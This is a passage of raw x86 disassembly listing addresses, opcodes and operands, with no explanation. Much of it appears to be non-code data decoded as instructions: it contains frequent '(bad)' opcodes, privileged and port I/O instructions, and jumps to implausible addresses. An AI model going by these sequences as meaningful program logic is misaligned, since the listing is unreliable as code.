  41414b:	mov    esi,0xa80ffe69
  414150:	and    eax,0xc2481e71
  414155:	mov    DWORD PTR [edx-0x5b7041c7],esp
  41415b:	leave  
  41415c:	inc    esp
  41415d:	mov    esp,ecx
  41415f:	push   cs
  414160:	sbb    ah,BYTE PTR [eax]
  414162:	mov    ecx,0x53a64af0
  414167:	(bad)  
  414168:	cmp    ecx,DWORD PTR [eiz*8-0x60ae868a]
  41416f:	and    al,0xf
  414171:	push   0xffffff8c
  414173:	xlat   BYTE PTR ds:[ebx]
  414174:	jns    0x414150
  414176:	push   es
  414177:	xor    DWORD PTR [eax-0xa],ecx
  41417a:	dec    ecx
  41417b:	sub    ebp,DWORD PTR [ebp+0x48]
  41417e:	pusha  
  41417f:	pop    ebp
  414180:	pop    eax
  414181:	jnp    0x41416c
  414183:	dec    ebp
  414184:	(bad)  
  414185:	xchg   ebp,eax
  414186:	icebp  
  414187:	inc    edx
  414188:	mov    al,0xa2
  41418a:	pop    edi
  41418b:	sub    dl,bh
  41418d:	fadd   DWORD PTR [ecx]
  41418f:	pop    ecx
  414190:	inc    eax
  414191:	mov    ecx,0xf2f2c467
  414196:	retf   
  414197:	mov    BYTE PTR [esi-0x6c3487cf],ah
  41419d:	adc    eax,0xd8cbded7
  4141a2:	out    0xb4,eax
  4141a4:	lock dec ebp
  4141a6:	pop    esi
  4141a7:	push   ds
  4141a8:	pop    ss
  4141a9:	int    0x73
  4141ab:	xchg   ecx,eax
  4141ac:	adc    bh,BYTE PTR [esi+0x7b190e63]
  4141b2:	sub    BYTE PTR [ebx+ecx*1-0x387e0651],0xcd
  4141ba:	icebp  
  4141bb:	jg     0x4141b5
  4141bd:	iret   
  4141be:	jp     0x4141a3
  4141c0:	call   0xef4a55fc
  4141c5:	lahf   
  4141c6:	xor    DWORD PTR [eax],0x13
  4141c9:	lods   al,BYTE PTR ds:[esi]
  4141ca:	retf   
  4141cb:	out    0x42,al
  4141cd:	and    bl,BYTE PTR [esp]
  4141d0:	mov    cl,0x72
  4141d2:	inc    edi
  4141d3:	jns    0x4141ab
  4141d5:	inc    ebp
  4141d6:	mov    edx,0xab65fdfa
  4141db:	dec    eax
  4141dc:	or     BYTE PTR [ebp+0x55],0xa1
  4141e0:	sub    eax,DWORD PTR [ebx+ebx*8+0x67]
  4141e4:	ja     0x41422a
  4141e6:	daa    
  4141e7:	mov    edx,0x22b21b52
  4141ed:	cmp    BYTE PTR [eax],al
	...
  414253:	add    BYTE PTR [eax],al
  414255:	add    BYTE PTR [edx],al
  414257:	adc    al,BYTE PTR [ecx]
  414259:	mov    ds:0xb3a2b311,eax
  41425e:	mov    DWORD PTR [ecx+0x37],edx
  414261:	push   edi
  414262:	jecxz  0x414216
  414264:	ds push 0x67
  414267:	fld    DWORD PTR [eax]
  414269:	add    BYTE PTR [eax],al
  41426b:	add    DWORD PTR [eax],eax
  41426d:	add    bh,bh
  41426f:	pushf  
  414270:	cmp    al,0x58
  414272:	stos   DWORD PTR es:[edi],eax
  414273:	leave  
  414274:	fist   WORD PTR [esi-0x204c60ae]
  41427a:	pop    edi
  41427b:	or     ecx,DWORD PTR [ecx-0x37]
  41427e:	or     al,0xa6
  414280:	in     al,0x5d
  414282:	jecxz  0x4142ce
  414284:	fnstenv [esi]
  414286:	sahf   
  414287:	in     eax,dx
  414288:	test   eax,0x40bd89d2
  41428d:	inc    edx
  41428e:	sub    dh,bl
  414290:	pop    ebp
  414291:	jbe    0x414260
  414293:	push   ecx
  414294:	rcr    ecx,0x74
  414297:	dec    eax
  414298:	sahf   
  414299:	xchg   edi,eax
  41429a:	hlt    
  41429b:	jmp    0x20d702c0
  4142a0:	leave  
  4142a1:	(bad)  
  4142a2:	cdq    
  4142a3:	cmp    DWORD PTR [edi-0x32],esi
  4142a6:	imul   BYTE PTR [ebx+ebp*2]
  4142a9:	sbb    al,0x40
  4142ab:	loope  0x414315
  4142ad:	int    0xc6
  4142af:	pop    edi
  4142b0:	sbb    BYTE PTR [eax],al
  4142b2:	rcr    ebx,1
  4142b4:	ss xchg esp,eax
  4142b6:	sub    ch,BYTE PTR [esi-0x63b44ce6]
  4142bc:	mov    al,ch
  4142be:	inc    ebp
  4142bf:	fisubr WORD PTR [ecx+0x69c1f366]
  4142c5:	idiv   BYTE PTR [edx]
  4142c7:	mov    al,ds:0x5ce63434
  4142cc:	mov    DWORD PTR [edi+0x621b13b],edi
  4142d2:	cmc    
  4142d3:	jns    0x41432e
  4142d5:	inc    ebx
  4142d6:	in     eax,0xbe
  4142d8:	ficom  DWORD PTR [ecx]
  4142da:	push   esp
  4142db:	ja     0x4142a4
  4142dd:	push   cs
  4142de:	neg    DWORD PTR [eax-0x4facd92e]
  4142e4:	test   ebp,ecx
  4142e6:	push   0x23
  4142e8:	das    
  4142e9:	mov    ds:0x5d919df8,eax
  4142ee:	in     al,0xce
  4142f0:	in     al,dx
  4142f1:	das    
  4142f2:	fistp  WORD PTR [ebp-0x19]
  4142f5:	aam    0x6
  4142f7:	(bad)  
  4142f8:	daa    
  4142f9:	imul   DWORD PTR [ebx-0x2e]
  4142fc:	mov    DWORD PTR [eax],edi
  4142fe:	push   edi
  4142ff:	adc    BYTE PTR [ebp+0x21401f4d],ah
  414305:	aas    
  414306:	lahf   
  414307:	mov    bl,0x83
  414309:	pop    eax
  41430a:	add    BYTE PTR [esi],dh
  41430c:	cmp    esp,DWORD PTR [eax+0x8f3d272]
  414312:	mov    eax,0xc0336201
  414317:	or     ebp,edx
  414319:	sub    eax,0x4c92bd34
  41431e:	(bad)  
  41431f:	sbb    BYTE PTR [edi+0x5f],0xc7
  414323:	pushf  
  414324:	jae    0x414345
  414326:	adc    al,0xad
  414328:	vmread ebp,ebx
  41432b:	pop    eax
  41432c:	(bad)  
  41432d:	sub    edx,DWORD PTR [ebx]
  41432f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414330:	(bad)  
  414331:	pop    ebx
  414332:	cmp    al,0x6a
  414334:	or     BYTE PTR [edx-0xd8d81a0],ah
  41433a:	jns    0x41431d
  41433c:	pop    edi
  41433d:	adc    al,0x15
  41433f:	mov    esp,0x2822ab78
  414344:	fs add eax,0x537fc7fd
  41434a:	jne    0x4143bd
  41434c:	xor    ebx,edi
  41434e:	xor    BYTE PTR [eax-0x48],ah
  414351:	mov    WORD PTR [edx],cs
  414353:	inc    edi
  414354:	mov    bl,0x88
  414356:	(bad)  
  414358:	sbb    al,BYTE PTR ds:0x61bccd49
  41435e:	aam    0x6d
  414360:	mov    dl,0x28
  414362:	inc    ecx
  414363:	cli    
  414364:	inc    esp
  414365:	dec    ebx
  414366:	mov    eax,ds:0xa64578b
  41436c:	shl    esi,0x0
	...
  4143d3:	add    BYTE PTR [eax],al
  4143d5:	add    BYTE PTR [ecx],al
  4143d7:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  4143de:	rol    DWORD PTR [ebp+0x5e],0xa1
  4143e2:	test   al,0xe3
  4143e4:	or     BYTE PTR [edi+eiz*2],dl
  4143e7:	fiadd  DWORD PTR [eax]
  4143e9:	add    BYTE PTR [eax],al
  4143eb:	add    DWORD PTR [eax],eax
  4143ed:	add    BYTE PTR [edx-0x38],dl
  4143f0:	lods   eax,DWORD PTR ds:[esi]
  4143f1:	push   es
  4143f2:	or     eax,0x102f979c
  4143f7:	push   ebp
  4143f8:	pop    es
  4143f9:	mov    esp,esp
  4143fb:	adc    BYTE PTR [esi+0x4c2224b4],bh
  414401:	cdq    
  414402:	pop    esp
  414403:	imul   esp
  414405:	ins    DWORD PTR es:[edi],dx
  414406:	(bad)  
  414407:	das    
  414408:	aad    0xc0
  41440a:	lds    esi,FWORD PTR [ebp-0x53185316]
  414410:	loope  0x414415
  414412:	call   0x6d994980
  414417:	mov    bl,0x86
  414419:	scas   al,BYTE PTR es:[edi]
  41441a:	adc    edx,DWORD PTR [esi+0x3611addc]
  414420:	xchg   al,ch
  414422:	and    ebx,esp
  414424:	jecxz  0x4143e8
  414426:	jp     0x414437
  414428:	mov    edi,0x258fac06
  41442d:	popa   
  41442e:	pusha  
  41442f:	call   0xf4ff:0x506f6ede
  414436:	xchg   ebx,eax
  414437:	cmc    
  414438:	retf   0xc8ef
  41443b:	adc    al,0x47
  41443d:	xchg   ebx,eax
  41443e:	pop    esp
  41443f:	xchg   ebp,eax
  414440:	push   eax
  414441:	xchg   bh,al
  414443:	sub    al,0xaf
  414445:	inc    ecx
  414446:	cli    
  414447:	xor    eax,0x1384e3d9
  41444c:	(bad)  
  41444d:	dec    ebp
  41444e:	out    0xf7,al
  414450:	jge    0x41447d
  414452:	or     BYTE PTR [edi],dl
  414454:	and    eax,esi
  414456:	fidiv  WORD PTR [eax+esi*4]
  414459:	pop    ds
  41445a:	dec    ecx
  41445b:	xchg   ecx,eax
  41445c:	jbe    0x414473
  41445e:	not    BYTE PTR [ecx+0x66]
  414461:	(bad)  
  414462:	pop    eax
  414463:	inc    edx
  414464:	dec    eax
  414465:	not    BYTE PTR [edi+0x4e]
  414468:	int    0x86
  41446a:	test   ah,bl
  41446c:	dec    edi
  41446d:	in     eax,dx
  41446e:	pop    ss
  41446f:	sbb    cl,BYTE PTR [edx-0x2d4cf6aa]
  414475:	clc    
  414476:	mov    bl,0xd3
  414478:	lods   al,BYTE PTR ds:[esi]
  414479:	jmp    0x4144ba
  41447b:	mov    esi,0x8588a487
  414480:	sub    ebx,DWORD PTR [eax]
  414482:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414483:	jne    0x414439
  414485:	dec    edi
  414486:	das    
  414487:	adc    dh,BYTE PTR [esi+0x37]
  41448a:	jmp    0x7147cca6
  41448f:	sbb    edi,DWORD PTR [edi-0x5fe3988a]
  414495:	add    bh,al
  414497:	test   BYTE PTR [edx-0x1b718d24],cl
  41449d:	lds    ebx,FWORD PTR [ebx+0x41]
  4144a0:	pop    ds
  4144a1:	mov    eax,0x4157d1a2
  4144a6:	in     eax,0xb2
  4144a8:	add    edx,DWORD PTR [ebp+0xe510f2c]
  4144ae:	fcomp  DWORD PTR [esi-0x61a1c34b]
  4144b4:	sar    BYTE PTR [ebx],1
  4144b6:	and    edi,DWORD PTR [edx+0x510c6f9d]
  4144bc:	sbb    edi,DWORD PTR [edx]
  4144be:	cwde   
  4144bf:	xchg   ebp,eax
  4144c0:	sti    
  4144c1:	out    dx,al
  4144c2:	sbb    al,0x2f
  4144c4:	stc    
  4144c5:	mov    DWORD PTR [edi+edx*1],esp
  4144c8:	pop    edx
  4144c9:	mov    dl,0xe3
  4144cb:	dec    esi
  4144cc:	lock mov al,0xb9
  4144cf:	clc    
  4144d0:	mov    bl,0x6
  4144d2:	fsub   QWORD PTR [ebx+0x480bf362]
  4144d8:	xchg   ecx,eax
  4144d9:	xor    DWORD PTR [ebp-0x66],eax
  4144dc:	stc    
  4144dd:	jnp    0x414488
  4144df:	sbb    DWORD PTR [edi+0x16],edx
  4144e2:	stos   BYTE PTR es:[edi],al
  4144e3:	sub    esp,DWORD PTR [ebx+0x31]
  4144e6:	and    al,0x50
  4144e8:	inc    ebp
  4144e9:	and    ebx,0xffffff9b
  4144ec:	add    ch,0x0
	...
  414553:	add    BYTE PTR [eax],al
  414555:	add    BYTE PTR [ebx+0x73],bl
  414558:	inc    edx
  414559:	or     eax,0x775f3d6a
  41455e:	pop    ds
  41455f:	dec    edi
  414560:	or     cl,BYTE PTR [esi-0x72]
  414563:	stc    
  414564:	sbb    al,0x63
  414566:	fild   DWORD PTR [bx+si]
  414569:	add    BYTE PTR [eax],al
  41456b:	add    DWORD PTR [eax],eax
  41456d:	add    BYTE PTR [edx-0x43],cl
  414570:	loopne 0x41459a
  414572:	les    esp,FWORD PTR cs:[ebx+ebx*8-0x69]
  414577:	inc    eax
  414578:	imul   ebx,DWORD PTR [ecx-0x5e37d3ea],0x8a308005
  414582:	fisub  DWORD PTR [edi+0x109dd261]
  414588:	mov    ebp,0xf2cc621d
  41458d:	mov    edi,0xe959f8e6
  414592:	mov    edx,0xbc2fcd31
  414597:	cwde   
  414598:	dec    eax
  414599:	call   0x89379ad1
  41459e:	dec    eax
  41459f:	dec    ecx
  4145a0:	xchg   edx,eax
  4145a1:	mov    ebx,0xf6dcddd3
  4145a6:	ss out 0xca,al
  4145a9:	js     0x414535
  4145ab:	cmc    
  4145ac:	inc    ebx
  4145ad:	retf   
  4145ae:	jge    0x41456f
  4145b0:	and    al,0xaf
  4145b2:	imul   edi,DWORD PTR [eax-0x62],0xffffffc4
  4145b6:	sbb    al,0xbf
  4145b8:	(bad)  
  4145ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145bb:	popa   
  4145bc:	cdq    
  4145bd:	add    eax,0xf03d7073
  4145c2:	outs   dx,DWORD PTR ds:[esi]
  4145c3:	in     eax,dx
  4145c4:	xor    eax,DWORD PTR [edi-0x7c953a7a]
  4145ca:	repz sbb dl,BYTE PTR [edx+0x74e49dd5]
  4145d1:	and    BYTE PTR [ebp+0x2a],bh
  4145d4:	sbb    DWORD PTR [ebp-0x1a],esi
  4145d7:	sbb    ebp,edi
  4145d9:	sahf   
  4145da:	ins    DWORD PTR es:[edi],dx
  4145db:	mov    dh,0x44
  4145dd:	jecxz  0x4145d9
  4145df:	dec    ebp
  4145e0:	bnd jae 0x41458f
  4145e3:	adc    dh,cl
  4145e5:	test   eax,0x98654ad8
  4145ea:	rol    BYTE PTR [esi-0x4],cl
  4145ed:	xor    DWORD PTR [eax],ebp
  4145ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145f0:	stos   BYTE PTR es:[edi],al
  4145f1:	mov    esp,0xfc7bf95c
  4145f6:	or     ecx,edx
  4145f8:	jne    0x4145b9
  4145fa:	cmp    bl,bh
  4145fc:	clc    
  4145fd:	ja     0x4145ea
  4145ff:	dec    edx
  414600:	scas   al,BYTE PTR es:[edi]
  414601:	push   ecx
  414602:	mov    ebp,0x8641c01d
  414607:	mov    ds:0xa42edbba,eax
  41460c:	or     dl,BYTE PTR [edx]
  41460e:	mov    dh,0x3f
  414610:	icebp  
  414611:	push   ecx
  414612:	mov    al,ds:0x6201983f
  414617:	rcl    edx,1
  414619:	inc    esp
  41461a:	sbb    DWORD PTR [esi+esi*8],esi
  41461d:	push   ss
  41461e:	in     al,0x12
  414620:	push   esp
  414621:	imul   BYTE PTR [eax]
  414623:	sbb    DWORD PTR ds:[edi-0x2f],edx
  414627:	xlat   BYTE PTR ds:[ebx]
  414628:	retf   0xd60c
  41462b:	lea    ecx,[ecx-0x2096a172]
  414631:	jae    0x4146b2
  414633:	xchg   DWORD PTR [eax+0x6b],edi
  414636:	rcl    ch,1
  414638:	iret   
  414639:	fidiv  DWORD PTR [ebp-0xd2678f9]
  41463f:	nop
  414640:	xchg   esi,eax
  414641:	retf   
  414642:	jbe    0x41460d
  414644:	fwait
  414645:	xchg   ebp,eax
  414646:	push   edx
  414647:	out    0xd5,eax
  414649:	fidivr DWORD PTR [eax+0x12]
  41464c:	outs   dx,BYTE PTR ds:[esi]
  41464d:	add    BYTE PTR [ebp+0x551c7701],cl
  414653:	adc    DWORD PTR [ecx],0x7e4908ff
  414659:	adc    DWORD PTR [eax-0x77],esi
  41465c:	aam    0xf0
  41465e:	repz in al,0xfd
  414661:	jne    0x4145ed
  414663:	loop   0x4145f4
  414665:	push   ss
  414666:	push   0x942a234d
  41466b:	sti    
  41466c:	mov    al,0xff
	...
  4146d6:	jg     0x414736
  4146d8:	cmc    
  4146d9:	ins    DWORD PTR es:[edi],dx
  4146da:	cmc    
  4146db:	out    dx,eax
  4146dc:	call   FWORD PTR [esi+0x17]
  4146df:	enter  0xab7a,0x1f
  4146e3:	in     eax,dx
  4146e4:	ret    0x67f4
  4146e7:	fadd   QWORD PTR [eax]
  4146e9:	add    BYTE PTR [eax],al
  4146eb:	add    DWORD PTR [eax],eax
  4146ed:	add    BYTE PTR [eax],bh
  4146ef:	sub    BYTE PTR [edi-0x595aff24],0xec
  4146f6:	cmc    
  4146f7:	add    DWORD PTR [ebp+0xcb2d333],esi
  4146fd:	sub    ah,BYTE PTR [eax]
  4146ff:	mov    BYTE PTR [ebx],dl
  414701:	scas   ax,WORD PTR es:[edi]
  414703:	lods   eax,DWORD PTR ds:[esi]
  414704:	push   es
  414705:	cmp    al,0x10
  414707:	xchg   BYTE PTR [ebx-0x366c61ff],dl
  41470d:	fsub   DWORD PTR [esi]
  41470f:	out    dx,al
  414710:	jmp    ecx
  414712:	jbe    0x41478c
  414714:	out    dx,eax
  414715:	xchg   edx,eax
  414716:	cmc    
  414717:	adc    ah,BYTE PTR [ecx]
  414719:	shl    ch,cl
  41471b:	loopne 0x41478b
  41471d:	ins    DWORD PTR es:[edi],dx
  41471e:	xor    DWORD PTR [esi+0x140433a1],eax
  414724:	hlt    
  414725:	(bad)  
  414726:	(bad)  
  414727:	test   eax,0xd15430fc
  41472c:	pop    ebp
  41472d:	pop    eax
  41472e:	push   ecx
  41472f:	mov    al,ds:0xc27b82b4
  414734:	(bad)  
  414735:	das    
  414736:	pop    esp
  414737:	mov    eax,0x50735795
  41473c:	int3   
  41473d:	sub    edi,DWORD PTR [ecx+edx*1-0x46db64fa]
  414744:	inc    ebx
  414745:	and    DWORD PTR [eax+0x2046fc2a],edi
  41474b:	bound  esp,QWORD PTR [eax-0x61]
  41474e:	out    0x2e,eax
  414750:	gs inc ebp
  414752:	adc    ch,BYTE PTR [eax+ecx*8-0x2beb2f71]
  414759:	dec    ebp
  41475a:	pop    ebx
  41475b:	imul   ecx,DWORD PTR ds:0xa472f89,0x7862f388
  414765:	and    BYTE PTR [ecx-0x4456d398],0x2
  41476c:	dec    ecx
  41476d:	jnp    0x41473c
  41476f:	fadd   st(4),st
  414771:	es pop esi
  414773:	adc    eax,0x8d09f6d6
  414778:	mov    ecx,0xfc4876b
  41477d:	xchg   ah,bh
  41477f:	fucom  st(6)
  414781:	xchg   BYTE PTR es:[ebp+0x772694db],ch
  414788:	pop    esp
  414789:	outs   dx,BYTE PTR ds:[esi]
  41478a:	lahf   
  41478b:	inc    DWORD PTR [ebp-0xa]
  41478e:	cmp    al,dl
  414790:	les    esi,FWORD PTR [edi-0xd30ddc2]
  414796:	test   al,0x94
  414798:	sub    esp,DWORD PTR [ebp+0x17]
  41479b:	mov    gs,WORD PTR [ebp-0x21]
  41479e:	jbe    0x4147e6
  4147a0:	imul   ebx,esp,0x9aa3a06d
  4147a6:	inc    edi
  4147a7:	retf   
  4147a8:	in     eax,dx
  4147a9:	stc    
  4147aa:	mov    ebx,0x1335b30c
  4147af:	imul   esi,DWORD PTR [ebp-0x50795ba8],0x9c8df0f5
  4147b9:	mov    al,0x15
  4147bb:	outs   dx,DWORD PTR ds:[esi]
  4147bc:	call   0xebe46a06
  4147c1:	pushf  
  4147c2:	mov    al,ds:0xb441e882
  4147c7:	scas   eax,DWORD PTR es:[edi]
  4147c8:	or     eax,0x58d3bac
  4147cd:	jg     0x414772
  4147cf:	xor    edx,DWORD PTR [esi-0x6238b82b]
  4147d5:	push   ecx
  4147d6:	mov    ?,edx
  4147d8:	test   eax,0x3a74a896
  4147dd:	out    dx,al
  4147de:	(bad)  
  4147df:	pop    ds
  4147e0:	push   0xffffffa9
  4147e2:	adc    BYTE PTR [edx],0xb
  4147e5:	shl    BYTE PTR [esi+0x74],1
  4147e8:	(bad)  
  4147e9:	fbstp  TBYTE PTR [eax+0x181095]
	...
  414853:	add    BYTE PTR [eax],al
  414855:	add    BYTE PTR [esi+0x2f],bh
  414858:	add    DWORD PTR [ebp+0x51],ebp
  41485b:	outs   dx,DWORD PTR ds:[esi]
  41485c:	jle    0x41489d
  41485e:	aas    
  41485f:	mov    BYTE PTR [esi],cl
  414861:	cmp    eax,0x606d4e74
  414866:	fld    QWORD PTR [bx+si]
  414869:	add    BYTE PTR [eax],al
  41486b:	add    DWORD PTR [eax],eax
  41486d:	add    BYTE PTR [ebx-0x4b],al
  414870:	mov    ebx,0xa27b935
  414875:	pop    edi
  414876:	xlat   BYTE PTR ds:[ebx]
  414877:	mov    ds:0x38577f45,al
  41487c:	sahf   
  41487d:	mov    dh,0x9
  41487f:	xor    BYTE PTR [ebx-0x43b0f20c],dh
  414885:	sub    DWORD PTR [ecx],esp
  414887:	into   
  414888:	(bad)  
  414889:	ss jns 0x41487f
  41488c:	pop    ss
  41488d:	fucomp st(0)
  41488f:	mov    DWORD PTR [edx-0x7d],esp
  414892:	cwde   
  414893:	sahf   
  414894:	and    al,BYTE PTR [eax-0x50f42686]
  41489a:	push   edx
  41489b:	jb     0x4148ce
  41489d:	fsubr  st,st(6)
  41489f:	ror    DWORD PTR [ebp+edx*8+0x12],1
  4148a3:	sbb    al,0xf3
  4148a5:	jp     0x41482c
  4148a7:	cdq    
  4148a8:	es dec edi
  4148aa:	push   0x6bfaa20b
  4148af:	mov    edi,0xa249a836
  4148b4:	cmp    BYTE PTR [edi-0x533e90ae],bl
  4148ba:	mov    WORD PTR [edx+eax*4-0x46],ds
  4148be:	push   0xa961055d
  4148c3:	cs (bad) 
  4148c5:	mov    dl,0xb1
  4148c7:	fist   WORD PTR [ebx]
  4148c9:	stos   BYTE PTR es:[edi],al
  4148ca:	xchg   ebp,eax
  4148cb:	div    BYTE PTR ds:0xb3bf8f2c
  4148d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148d2:	pop    ebp
  4148d3:	int3   
  4148d4:	sar    DWORD PTR [edi],0x50
  4148d7:	cmp    al,0xc5
  4148d9:	xchg   ecx,eax
  4148da:	ins    BYTE PTR es:[edi],dx
  4148db:	(bad)  
  4148dc:	mov    eax,ds:0xa3b18d37
  4148e1:	pop    ebx
  4148e2:	add    BYTE PTR [ebx+0x52],bl
  4148e5:	pop    es
  4148e6:	mov    edx,0xf60dc3af
  4148eb:	out    0x3c,al
  4148ed:	push   eax
  4148ee:	xchg   edx,eax
  4148ef:	sub    cl,BYTE PTR [edi]
  4148f1:	shl    esi,0xb7
  4148f4:	popf   
  4148f5:	test   BYTE PTR [edi+ebp*4],bl
  4148f8:	(bad)  
  4148f9:	and    al,BYTE PTR [edi+0x5d8c63e9]
  4148ff:	xchg   ecx,eax
  414900:	(bad)  
  414901:	ds pop eax
  414903:	les    edi,FWORD PTR [eax-0x33]
  414906:	mov    ch,0x11
  414908:	sar    DWORD PTR [esi-0x7],cl
  41490b:	sbb    BYTE PTR [eax],bl
  41490d:	and    al,bl
  41490f:	sahf   
  414910:	call   edi
  414912:	nop
  414913:	xor    BYTE PTR [ecx],ah
  414915:	sbb    al,0xf
  414917:	mov    ah,0x87
  414919:	cmp    eax,0x4e83a9c6
  41491e:	xchg   ah,bh
  414920:	and    ch,BYTE PTR [edx]
  414922:	xor    BYTE PTR [eax-0x7d],bl
  414925:	ja     0x41492c
  414927:	mov    ds:0x6e2328b5,eax
  41492c:	inc    ebx
  41492d:	xchg   ch,bh
  41492f:	jl     0x4148fb
  414931:	cmc    
  414932:	cmp    ebp,ebp
  414934:	leave  
  414935:	aaa    
  414936:	pop    es
  414937:	or     DWORD PTR [edx+0x5e],esi
  41493a:	mov    ch,BYTE PTR [ebx-0x67085f6d]
  414940:	cwde   
  414941:	test   BYTE PTR [edx-0x6],0xc4
  414945:	sub    bh,0x1a
  414948:	adc    eax,0x129a04ea
  41494d:	test   BYTE PTR [ecx-0x10],ah
  414950:	inc    edx
  414951:	cs daa 
  414953:	imul   ebp,DWORD PTR [bx+0x1b],0xa420789c
  41495b:	outs   dx,DWORD PTR ds:[esi]
  41495c:	mov    esi,0xbfbe1b31
  414961:	lea    eax,[eax+edi*2-0x4]
  414965:	dec    edx
  414966:	sub    ebx,DWORD PTR [esi]
  414968:	or     ch,bh
  41496a:	mov    ds:0x6e2b14,al
	...
  4149d3:	add    BYTE PTR [eax],al
  4149d5:	add    BYTE PTR [ebx],cl
  4149d7:	jle    0x4149ab
  4149d9:	and    esi,edi
  4149db:	scas   eax,DWORD PTR es:[edi]
  4149dc:	sti    
  4149dd:	jle    0x4149c5
  4149df:	pop    edx
  4149e0:	push   ds
  4149e1:	pop    es
  4149e2:	add    ecx,DWORD PTR [edi-0x58]
  4149e5:	jb     0x414a4e
  4149e7:	fiadd  WORD PTR [eax]
  4149e9:	add    BYTE PTR [eax],al
  4149eb:	add    DWORD PTR [eax],eax
  4149ed:	add    BYTE PTR [esi],al
  4149ef:	(bad)  
  4149f0:	loope  0x414993
  4149f2:	gs into 
  4149f4:	mov    esp,0x80325e06
  4149f9:	push   ebx
  4149fa:	hlt    
  4149fb:	xchg   esi,eax
  4149fc:	cli    
  4149fd:	adc    BYTE PTR ss:[edi],0xf1
  414a01:	inc    ebp
  414a02:	out    0x4b,al
  414a04:	shl    DWORD PTR [edi-0x203a1b49],0x56
  414a0b:	push   cs
  414a0c:	test   eax,0xb33beb58
  414a11:	repz cmp DWORD PTR [ebp+0x393dc746],esi
  414a18:	xchg   BYTE PTR [ecx-0x7f],bl
  414a1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a1c:	xchg   ecx,eax
  414a1d:	and    ah,BYTE PTR [ebp-0x7c8d924c]
  414a23:	mov    esi,0xa0841b87
  414a28:	cmc    
  414a29:	mov    eax,ds:0x1d071bf3
  414a2e:	popa   
  414a2f:	scas   eax,DWORD PTR es:[edi]
  414a30:	push   0xffffffe4
  414a32:	cli    
  414a33:	retf   0xfcd5
  414a36:	stc    
  414a37:	repnz push edx
  414a39:	pop    ss
  414a3a:	pop    ecx
  414a3b:	mov    ebp,0xb27a4d90
  414a40:	and    al,0x7f
  414a42:	push   es
  414a43:	dec    ebp
  414a44:	cwde   
  414a45:	ja     0x4149d1
  414a47:	mov    edx,DWORD PTR [esp+eiz*2]
  414a4a:	fiadd  WORD PTR [eax+0x46]
  414a4d:	pop    esp
  414a4e:	in     al,0x32
  414a50:	pop    ss
  414a51:	(bad)  
  414a52:	outs   dx,DWORD PTR ds:[esi]
  414a53:	jae    0x4149e7
  414a55:	je     0x414a51
  414a57:	mov    ch,0x6d
  414a59:	adc    ebp,ebx
  414a5b:	mov    eax,ds:0x31d84a36
  414a60:	in     eax,dx
  414a61:	test   al,0x7c
  414a63:	jo     0x414a6a
  414a65:	sbb    BYTE PTR [eax],bl
  414a67:	cmp    al,0xa7
  414a69:	inc    eax
  414a6a:	fidiv  DWORD PTR [ebx]
  414a6c:	stc    
  414a6d:	adc    DWORD PTR [ecx+edi*1],0x52
  414a71:	pop    ebx
  414a72:	add    al,0x40
  414a74:	add    al,0xd7
  414a76:	xor    eax,0x667a4a25
  414a7b:	jecxz  0x414af8
  414a7d:	int3   
  414a7e:	lahf   
  414a7f:	mov    esi,0xbaed38ad
  414a84:	jmp    0x3ef8:0x2b012405
  414a8b:	cmp    BYTE PTR [edx+0x74b21d3f],al
  414a91:	add    ecx,ecx
  414a93:	jbe    0x414b0c
  414a95:	xchg   edx,eax
  414a96:	lods   al,BYTE PTR ds:[esi]
  414a97:	cmp    DWORD PTR [eax-0x1142650c],0x9
  414a9e:	pop    edx
  414a9f:	cmp    al,0xf
  414aa1:	sbb    DWORD PTR [esi],esi
  414aa3:	mov    esp,0x97b092e5
  414aa8:	pop    ss
  414aa9:	mov    DWORD PTR [ecx-0x14],edx
  414aac:	loop   0x414b0d
  414aae:	and    al,0xed
  414ab0:	dec    edx
  414ab1:	mov    ds:0x8d708fe3,eax
  414ab6:	pushf  
  414ab7:	xor    al,BYTE PTR [eax+ebp*2+0x13d7b650]
  414abe:	xchg   ebx,eax
  414abf:	fdivr  QWORD PTR [edi+0x45]
  414ac2:	fist   DWORD PTR [esi+0x2a]
  414ac5:	sbb    DWORD PTR [ebx+0x73],esp
  414ac8:	idiv   DWORD PTR [esi-0x78]
  414acb:	push   eax
  414acc:	test   al,0x42
  414ace:	and    BYTE PTR [edx+edx*1-0x7f],dl
  414ad2:	in     eax,dx
  414ad3:	xchg   ebp,eax
  414ad4:	push   ecx
  414ad5:	cmp    DWORD PTR [esi+eax*2+0x4d350cf5],0x43
  414add:	push   cs
  414ade:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414adf:	in     al,dx
  414ae0:	xor    ch,BYTE PTR [edx+0x7d]
  414ae3:	ds push es
  414ae5:	ror    BYTE PTR [ebx],0x40
  414ae8:	add    al,0x84
  414aea:	cmp    esp,DWORD PTR [ecx+edx*4+0x39]
	...
  414b56:	lahf   
  414b57:	fnstcw WORD PTR [esi]
  414b59:	ss jle 0x414b53
  414b5c:	lahf   
  414b5d:	stc    
  414b5e:	bound  esp,QWORD PTR [ebx+0x561c63d9]
  414b64:	retf   0x67bf
  414b67:	fild   WORD PTR [eax]
  414b69:	add    BYTE PTR [eax],al
  414b6b:	add    DWORD PTR [eax],eax
  414b6d:	add    BYTE PTR [eax-0x72],dl
  414b70:	cwde   
  414b71:	cmp    al,0xb0
  414b73:	test   BYTE PTR [ecx],0x92
  414b76:	jmp    0x26689390
  414b7b:	stos   DWORD PTR es:[edi],eax
  414b7c:	xor    al,0xfd
  414b7e:	pop    eax
  414b7f:	inc    ecx
  414b80:	imul   esp,DWORD PTR [ebp-0x2374e8c1],0x642824fb
  414b8a:	inc    ecx
  414b8b:	ficom  DWORD PTR [edx]
  414b8d:	enter  0xb7c4,0xed
  414b91:	sub    bl,BYTE PTR [eax+0x38]
  414b94:	icebp  
  414b95:	mov    esi,0x7d6ee5b2
  414b9a:	lods   al,BYTE PTR ds:[esi]
  414b9b:	jmp    0x414bd3
  414b9d:	pushf  
  414b9e:	mov    dh,0x39
  414ba0:	push   ebx
  414ba1:	pop    ds
  414ba2:	daa    
  414ba3:	out    dx,al
  414ba4:	sub    BYTE PTR [esi+esi*2],bl
